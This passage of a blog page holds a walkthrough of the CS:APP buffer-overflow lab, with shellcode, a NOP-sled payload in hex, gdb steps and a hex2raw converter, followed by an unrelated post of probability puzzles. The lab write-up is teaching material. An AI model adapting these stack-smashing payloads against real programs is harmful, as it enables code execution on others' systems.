<p>把这些十六进制机器码写入文件in3</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">b8 9f 27 50 2a bd 30 3b 68 55</div><div class="line">68 93 8c 04 08 c3 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 d8 3a 68 55</div></pre></td></tr></table></figure>
<p>剩下的步骤照旧</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$./hex2raw in3 out3</div><div class="line">$./bufbomb &lt; out3 -u yy</div></pre></td></tr></table></figure>
<p>结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Userid: yy</div><div class="line">Cookie: 0x2a50279f</div><div class="line">Type string:Boom!: getbuf returned 0x2a50279f</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure>
<h1 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h1><p>本级要使用./bufbomb的-n参数，bufbomb不会再像从前哪样调用test()，而是调用testn()，testn()又调用getbufn().本级的任务是使getn返回cookie给testn()。听上去似乎与上一级没什么不同，但实际上该级的栈地址是动态的，每次都不一样，bufbomb会连续要我们输入5次字符串，每次都调用getbufn(),每次的栈地址都不一样，我么将不能再使用原来用gdb调试的方法来求%ebp的地址了。<br>bufbomb在5次调用testn()和getbufn()的过程中，两个函数的栈是连续的，在testn()汇编代码开头有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">8048c1c: 55                      push   %ebp</div><div class="line">8048c1d: 89 e5                   mov    %esp,%ebp</div><div class="line">8048c1f: 83 ec 28                sub    $0x28,%esp</div></pre></td></tr></table></figure>
<p>可知%esp=%ebp-0x28,即<br>%ebp=%esp+0x28<br>其中，getbufn执行ret前的leave指令已经正确地恢复%esp(leave等价于 mov %ebp,%esp; pop %ebp，我们的字符串无法覆盖%ebp,%esp寄存器，%esp是从寄存器%ebp里来的，因此是正确的)。</p>
<p>可以开始写代码~(≧▽≦)/~啦啦啦，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi rettestn.s</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov $0x2a50279f, %eax       //将cookie写入%eax,作为getbufn返回值</div><div class="line">lea 0x28(%esp), %ebp        //%ebp=%esp+0x28,恢复%ebp</div><div class="line">push $0x8048c2e</div><div class="line">ret                         //最后两句返回到testn中call getbufn下一句</div></pre></td></tr></table></figure>
<p>保存后，进行编译，再反汇编</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">gcc -m32 -c rettestn.s</div><div class="line">objdump -d rettestn.o &gt; rettestn_asm</div></pre></td></tr></table></figure>
<p>打开rettestn_asm有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0: b8 9f 27 50 2a         mov    $0x2a50279f,%eax</div><div class="line">   5: 8d 6c 24 28            lea    0x28(%esp),%ebp</div><div class="line">   9: 68 2e 8c 04 08         push   $0x8048c2e</div><div class="line">   e: c3                     ret</div></pre></td></tr></table></figure>
<p>可是我们还不知道返回地址应该用什么来填充。字符串首地址是变化的，虽然可以通过%esp间接求出，但在程序跳转到我们的代码之前，我们无法得知%esp的值究竟是多少（原来可以用gdb调试出来，但现在不行了）。幸好getbufn给的栈空间很大，我们可以利用nop slide技术，先让程序返回到一个我们大致猜测的地址，在这个地址及其附近的一大片区域里我们用nop指令(机器码为0x90)填充，CPU执行nop指令时除了程序计数器PC自加，别的什么也不做。把我们的代码放在这片区域的高位地址处，程序一路执行nop,就像滑行一样，一路滑到我们的代码才真正开始执行。我们可以利用gdb调试找到这个字符串开始的大致区域。</p>
<p>查看getbufn()汇编代码,有</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">8048bef: 8d 85 f8 fd ff ff    lea    -0x208(%ebp),%eax</div></pre></td></tr></table></figure>
<p>得知写入字符串的首地址为-0x208(%ebp)，而返回地址位于0x4(%ebp)，因此我们需填充0x4-（-0x208）= 0x20c = 524个字节的字符，再写4个字节覆盖getbufn()的返回地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">gdb bufbomb</div><div class="line">(gdb) b *0x8048bf5</div><div class="line">(gdb) r xxx -n -u yy</div><div class="line">(gdb) p /x $ebp-0x208</div><div class="line">$1 = 0x556838f8</div><div class="line">(gdb) c</div><div class="line">(gdb) p /x $ebp-0x208 </div><div class="line">$2 = 0x556838c8</div><div class="line">(gdb) c</div><div class="line">(gdb) p /x $ebp-0x208 </div><div class="line">$3 = 0x55683958</div><div class="line">(gdb) c</div><div class="line">(gdb) p /x $ebp-0x208 </div><div class="line">$3 = 0x55683958</div><div class="line">(gdb) c</div><div class="line">(gdb) p /x $ebp-0x208 </div><div class="line">$3 = 0x556838a8</div></pre></td></tr></table></figure>
<p>返回地址只要大于0x55683958即可，就取0x55683980(80 39 68 55)吧。</p>
<p>因此我们要输入的16进制数字为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line">90 90 90 90 90 90 90 90 90 90</div><div class="line"></div><div class="line">90 90 90 90 90 90 90 90 90 b8</div><div class="line">9f 27 50 2a 8d 6c 24 28 68 2e</div><div class="line">8c 04 08 c3 80 39 68 55</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ ./hex2raw -n in4 out4</div><div class="line">$ ./bufbomb &lt; out4 -n -u yy</div><div class="line">Userid: yy</div><div class="line">Cookie: 0x2a50279f</div><div class="line">Type string:KABOOM!: getbufn returned 0x2a50279f</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x2a50279f</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x2a50279f</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x2a50279f</div><div class="line">Keep going</div><div class="line">Type string:KABOOM!: getbufn returned 0x2a50279f</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure>
<p>打完收工~</p>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><p>我的hex2raw源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main(int argc, const char * argv[])</div><div class="line">&#123;</div><div class="line">    FILE *infile, *outfile;</div><div class="line">    int h, i;</div><div class="line">    //printf(&quot;%s, %s\n&quot;, argv[1], argv[2]);</div><div class="line">    if(strcmp(argv[1], &quot;-n&quot;))</div><div class="line">    &#123;</div><div class="line">        if(!(infile = fopen(argv[1], &quot;r&quot;)) || !(outfile = fopen(argv[2], &quot;w+&quot;)))&#123;</div><div class="line">            printf(&quot;打开文件错误!\n&quot;);</div><div class="line">            return 1;</div><div class="line">        &#125;</div><div class="line">        while(fscanf(infile, &quot;%x&quot;, &amp;h) != EOF)</div><div class="line">            fprintf(outfile, &quot;%c&quot;, h);</div><div class="line">    &#125;</div><div class="line">    else&#123;</div><div class="line">        if(!(infile = fopen(argv[2], &quot;r&quot;)) || !(outfile = fopen(argv[3], &quot;w+&quot;)))&#123;</div><div class="line">            printf(&quot;打开文件错误!\n&quot;);</div><div class="line">            return 1;</div><div class="line">        &#125;</div><div class="line">        for(i = 0; i &lt; 5; i ++)&#123;</div><div class="line">            while(fscanf(infile, &quot;%x&quot;, &amp;h) != EOF)</div><div class="line">                fprintf(outfile, &quot;%c&quot;, h);</div><div class="line">            fprintf(outfile, &quot;%c&quot;, &apos;\n&apos;);</div><div class="line">            rewind(infile);     //文件内部指针重新指向输入流开头</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    fclose(infile);</div><div class="line">    fclose(outfile);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">./hex2raw         // 输入文件名 输出文件名</div><div class="line">./hex2raw -n      // 输入文件名 输出文件名</div></pre></td></tr></table></figure>
<p>只支持以上两种格式<br>用于csapplab的bufbomb, 官网上下载的hex2raw死活用不了，出现同样问题的同学可以拿它自己编译试试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -g -c main.c -o hex2raw</div></pre></td></tr></table></figure>

          
        
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <div>
      
    </div>

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/03/04/有趣的概率题/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Yiyang Peng">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/7233064.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiyang's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/03/04/有趣的概率题/" itemprop="url">有趣的概率题</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-03-04T16:41:00+08:00">
                2017-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/数学/" itemprop="url" rel="index">
                    <span itemprop="name">数学</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="袜子抽屉"><a href="#袜子抽屉" class="headerlink" title="袜子抽屉"></a>袜子抽屉</h1><p>一个抽屉有红袜子和黑袜子，随机取出两支袜子都是红袜子的概率是0.5,(a)抽屉里最少有几只袜子？(b)如果抽屉中黑袜子的数量是偶数，抽屉里最少有几只袜子？<br>(a)4<br>(b)21<br><img src="http://img.blog.csdn.net/20170304165618520?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcTF3MmUzcjQ0NzA=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<h1 id="连胜"><a href="#连胜" class="headerlink" title="连胜"></a>连胜</h1><p>为了激励小明的网球生涯，如果他在三盘中连赢2盘，他爹就给他奖励，小明每盘可从他爹和俱乐部冠军中选一个作为对手，但不能连续选择一个人2次，即“爹-冠军-爹”或“冠军-爹-冠军”。冠军的水平比他爹高。小明应该选择哪种顺序？<br><img src="http://img.blog.csdn.net/20170304165337076?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQv/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<h1 id="轻浮的陪审员"><a href="#轻浮的陪审员" class="headerlink" title="轻浮的陪审员"></a>轻浮的陪审员</h1><p>三人陪审团中有2位以概率p独立地做出正确的决定，第三个人靠抛硬币做决定，最后以多数原则做出最后决定。另一个陪审团只有一个人，以概率p做正确决定。哪个陪审团更公正<br><img src="http://img.blog.csdn.net/20170305102314119?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcTF3MmUzcjQ0NzA=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<h1 id="抛到6为止"><a href="#抛到6为止" class="headerlink" title="抛到6为止"></a>抛到6为止</h1><p>平均需要掷几次色子才会掷出6？</p>
<ul>
<li>解法1：<br><img src="http://img.blog.csdn.net/20170305145156614?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcTF3MmUzcjQ0NzA=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></li>
<li>解法2：设平均需要掷m次色子才会掷出6，这是一个期望值。若第一次掷出的不是6（概率为q=1-p=5/6），则还需要掷m次，共掷m+1次；若第一次掷出6(概率为p=1/6)，则不需要再掷了，共掷1次。又总的期望应该是m，则有qx(m+1)+px1=m，解得m=1/p=6</li>
<li>解法3：<br>这是一个伯努利过程，首次成功的总实验次数俯冲参数为p的几何分布，次数的期望为1/p=6</li>
</ul>
<h1 id="方形中的硬币"><a href="#方形中的硬币" class="headerlink" title="方形中的硬币"></a>方形中的硬币</h1><p>在一个游戏中，一位玩家从5英尺的距离处抛掷一枚直径3/4英寸的便士到1平方英寸的方形桌面上。若便士完全落在桌子内，他将获得5先令，但无论输赢都不能拿回他的便士，如果便士落在桌子上，他赢的机会有多大。<br>不知道我翻译错没有，答案是1/16。</p>
<p><img src="http://img.blog.csdn.net/20170308222948394?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcTF3MmUzcjQ0NzA=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p>
<h1 id="Chuck-a-Luck"><a href="#Chuck-a-Luck" class="headerlink" title="Chuck-a-Luck"></a>Chuck-a-Luck</h1><p>Chuck-a-Luck是一种赌博游戏，玩家可给1，2，3，4，5，6中的任意数字下注，可同时给不同的数字下不同的筹码。庄家抛3个色子，若玩家的数字出现在1个，2个或3个色子中，他将相应地赢取所下注筹码的1倍、2倍、3倍，并赢回自己的筹码，否则输掉他下注的筹码。玩家们每单位筹码的期望损失是多少？<br>这个问题的理解有点难度，容易以玩家的角色带入，若把问题看作庄家每单位筹码的期望盈利是多少则会简单很多。这样我们可以合理地假设所有玩家给每个数字下注的机会是均等的，把所有玩家抽象为一个玩家，他每次给1,2,3,4,5,6都下注一个单位的筹码。</p>
<ol>
<li>当我们(庄家)开出三个不同的数字时，玩家获利3个单位，同时损失3个单位，我们没有盈利；这种情况第一个色子有6个数字可选，第二个有5个，第三个四个，有6x5x4=120种排列，每个色子有6种取法，三个色子共有6x6x6=216种排列，发生的概率是$120\over 216$；</li>
<li>当我们开出2个一样的数字时，玩家获利3个单位，同时损失4个单位，我们盈利1个单位，平均每单位筹码盈利$1\over 6$个单位筹码；该情况下从3个色子中取2个作为一样的数字，有3种取法，这两个色子的有6个数字可选，第三个色子只有5个数字可选，有$(_2^3)$x6x5=90种排列，发生的概率是$90 \over 216$；</li>
<li>当我们开出3个一样的数字时，玩家获利3个单位，同时损失5个单位，我们盈利2个单位，平均每单位筹码盈利${2 \over 6}={1 \over 3}$单位的筹码；这种情况在6个数字中选一个作为重复3次的数字，有6种取法，三个色子都只能从这个数字中选择，共6种排列，发生的概率是$6 \over 216$。</li>
</ol>
<p>三种情况的概率之和为1，不会再有别的情况了。因此我们庄家的期望收益是<br>$$0 \times \frac{120}{216} + \frac{1}{6} \times \frac{90}{216} + \frac{1}{3} \times \frac{6}{216} = \frac{17}{216} \approx 0.0787$$（比0.0398的50年中国国债收益高多了，还是不如房地产，果然是地产兴邦）。<br>因此玩家们的每单位筹码的损失是0.0787。 转轮相当于更多面的色子，指针或珠子停住的位置上的数字相当于色子开出的点数，比扔色子盈利更高，玩家损失更多, 所以说玩家还是要远离赌博。</p>
<h1 id="治疗强迫症赌徒"><a href="#治疗强迫症赌徒" class="headerlink" title="治疗强迫症赌徒"></a>治疗强迫症赌徒</h1><p>轮盘上有38个等可能的数字，如果玩家猜的数字中了，他将获得35倍的筹码以及他下注的筹码；否则输掉他下注的筹码。小明他爹不听小明的劝阻，总是在轮盘的13号位赌1块钱。为了帮助治疗他爹的强迫症，小明总是赌20块钱他爹将再36轮后亏本，（他爹亏本了就给小明20块钱，没亏本就挣小明20块钱），小明能让他爹吃到教训吗？</p>
<ul>
<li>这个问题首先要搞清楚小明他爹在36轮后亏本的概率分布，什么情况下亏本，什么情况下不亏本。试着算一下，36轮中只要赢一次，$+35 \times 1 + (-1) \times 35=0$，他爹正好不亏，36轮全输了才亏本，因此他爹36轮后亏本的概率分布为</li>
</ul>
<table>
<thead>
<tr>
<th>情况</th>
<th>亏本</th>
<th>不亏本</th>
</tr>
</thead>
<tbody>
<tr>
<td>概率</td>
<td>$({37 \over 38})^{36} \approx 0.383$</td>
<td>$1-0.383=0.617$</td>
</tr>
</tbody>
</table>
<p>因此小明他爹从小明那盈利的期望：$20 \times 0.617 +(– 20) \times 0.383 = 4.68$</p>
<ul>
<li>小明他爹每轮从赌场那盈利的期望：$35\times{1 \over 38} +(-1)\times{37 \over 38} = -{2 \over 38}$<br>36轮后从赌场盈利的期望：$-{2 \over 38} \times 36 \approx -1.89$</li>
<li>最后，小明他爹36轮后盈利的总期望：$4.68 – 1.89 = 2.99$</li>
</ul>
<p>哈哈，看来小明可能先吃到教训。不过要是小明运气好的话，可能小明他爹在第一次亏掉36+20=56块钱之后就不玩了。</p>
<h1 id="一手完美桥牌"><a href="#一手完美桥牌" class="headerlink" title="一手完美桥牌"></a>一手完美桥牌</h1><p>桥牌一般是扑克去掉大小王后的52张牌，4位玩家每人发13张牌。我们常听说某人被发了13张同花顺。在一副洗好的桥牌里获得一手同花顺的概率是多少？<br>$$\frac{4(^{13}_{13})}{(^{52}_{13})}=6.299 \times 10^{-12}$$</p>
<h1 id="Craps"><a href="#Craps" class="headerlink" title="Craps"></a>Craps</h1><p>Craps，也就是掷骰子，是美国玩起来最快也最流行的赌博游戏。每次掷2个骰子并合计点数，先掷出7或11的获胜，一旦掷出2,3或12则输了。掷出了其他的点数称为point，如果你先掷出的是point，那么你需要一直掷骰子直到你再掷出一次同样的point就算赢，掷出7则算输。每个玩家赢的概率有多大？</p>
<ul>
<li>2个骰子的和的分布律：</li>
</ul>
<table>
<thead>
<tr>
<th>total</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
<th>7</th>
<th>8</th>
<th>9</th>
<th>10</th>
<th>11</th>
<th>12</th>
</tr>
</thead>
<tbody>
<tr>
<td>p</td>
<td>${1 \over 36}$</td>
<td>${2 \over 36}$</td>
<td>${3 \over 36}$</td>
<td>${4 \over 36}$</td>
<td>${5 \over 36}$</td>
<td>${6 \over 36}$</td>
<td>${5 \over 36}$</td>
<td>${4 \over 36}$</td>
<td>${3 \over 36}$</td>
<td>${2 \over 36}$</td>
<td>${1 \over 36}$</td>
</tr>
</tbody>
</table>
<ul>
<li>第一次掷骰子情况</li>
</ul>
<table>
<thead>
<tr>
<th>case</th>
<th>total</th>
<th>sum</th>
</tr>
</thead>
<tbody>
<tr>
<td>win</td>
<td>7,11</td>
<td>6/36+2/36=8/36</td>
</tr>
<tr>
<td>lose</td>
<td>2,3,12</td>
<td>1/36+2/36+1/36=4/36</td>
</tr>
<tr>
<td>point</td>
<td>4,5,6,8,9,10</td>
<td>/36+4/36+5/36+5/36+4/36+3/36=24/36</td>
</tr>
</tbody>
</table>
<p>掷出point之后，需要重复掷骰子，虽然每次掷骰子有三种情况，输、赢和“再来一次”。但是总的来说你只有2个结果，输或者赢。如果你第一次掷的point是4，那么往后你掷出4就赢，掷出7就输，所以你赢的(条件)概率为p4/(p4+p7)=(3/36)/(3/36+6/36)=1/3，你可以理解为：将没事的情况里无限细分，最后所有赢的概率的和的极限就是1/3。其他的条件概率同理有：<br>5：p5/(p5+p7) = (4/36)/(4/36+6/36) = 2/5<br>6：p6/(p6+p7) = (5/36)/(5/36+6/36) = 5/11<br>8：p8/(p8+p7) = (5/36)/(5/36+6/36) = 5/11<br>9：p9/(p9+p7) = (4/36)/(4/36+6/36) = 2/5<br>10：p10/(p10+p7) = (3/36)/(3/36+6/36) = 1/3</p>
<p>因此总的来说赢的概率为<br>8/36 + (3/36 x 1/3 + 4/36 x 2/5 + 5/36 x 5/11 + 5/36 x 5/11 + 4/36 x 2/5 + 3/36 x 1/3) ≈0.49293</p>
<p>那么玩家没单位筹码的盈利期望为：1x(1-0.49293) +(– 1)x0.49293 = -0.01414, 每单位筹码的损失率是1.41%</p>
<p>再回头来看看条件概率的计算。假设你掷出point（赢）的概率为P，再算上你掷出7（输）的概率为6/36，那么你“再来一次”的概率为R=1-P-6/36。因此从第二次掷骰子开始(包括第二次)，你赢的概率为<br>P+RP+R2P+R3P+… = P(1+R+R2+R3+…) = P/(1-R) = P/[1-(1-P-6/36)] = P/(P+6/36)，与上面的计算相同。</p>
<h1 id="个人对于赌注的承受实验"><a href="#个人对于赌注的承受实验" class="headerlink" title="个人对于赌注的承受实验"></a>个人对于赌注的承受实验</h1><p>(a) 瓮中有10个黑球和10个白球，你指定颜色黑或白，再随机取球，若球的颜色和你指定的颜色匹配，你赢的10块钱。如果玩这个游戏需要花钱，你最多愿意花多少钱去玩这个游戏，假设只玩一次。<br>(b) 有的朋友有许多黑球和白球，他随意往瓮里求了若干白球和黑球，这次你最多愿意花多少钱玩？<br>A能算出期望，是5块钱，但是大部分人真不愿意付出5块钱，就玩一次，大多数人估计只愿意付出几毛钱或者几分钱。这个赌博游戏要是真设计成这样，玩一次只要几毛钱，黑白球比例还是1:1，那么庄家肯定要亏惨，但是你要玩家至少出5块钱那肯定没人玩。<br>(b) 和a一样，你猜中的概率是0.5，就算瓮里全部是黑球，在你不知道的情况下，你的选项还是2个，猜中的概率还是0.5。不过这游戏恐怕更没人玩了，条件太少了，让人觉得根本就是瞎扯。哈哈，实际上两个游戏一样都是瞎猜。</p>
<h1 id="沉默的合作"><a href="#沉默的合作" class="headerlink" title="沉默的合作"></a>沉默的合作</h1><p>两个陌生人被分开地要求从所有数字中选择一个正数，如果两个人选择的数字恰好相同则会获得奖励，你会选择哪个数字？<br>这听起来像是个0概率事件。但是这种选择不是随机选择，每个数字对人们的吸引力是不一样的。一想到要选一个别人也很可能会选择的数，没人会选择超过个位数的数，1最自然的想法，也是最多被选择的数，有的人也选择3和7。</p>
<h1 id="Quo-Vadis-拉丁语，你去往何处？"><a href="#Quo-Vadis-拉丁语，你去往何处？" class="headerlink" title="Quo Vadis? (拉丁语，你去往何处？)"></a>Quo Vadis? (拉丁语，你去往何处？)</h1><p>2个仅通过密码联系的陌生人约定星期四中午12点在纽约会面，准备干一票大的。他们都不熟悉纽约，结果这俩2逼出发后才发现他们忘记约定在纽约的那里会面。然而他们还是想见面，你说他们会去哪里？<br>帝国大厦，机场，火车站信息台，自由女神像，时代广场，都是1964年能想到的地方。 当陌生人知道到达那里是多么困难的时候，自由女神像就会被排除。 机场距离城市距离很远也会被排除。 在我(作者)看来，有两个重要的火车站将被排除。 这将留下帝国大厦或时代广场。 我会选择帝国大厦，因为时代广场日益庞大。 我认为如果他们在旧金山或巴黎见过面，他们的问题会更容易，不是吗？</p>
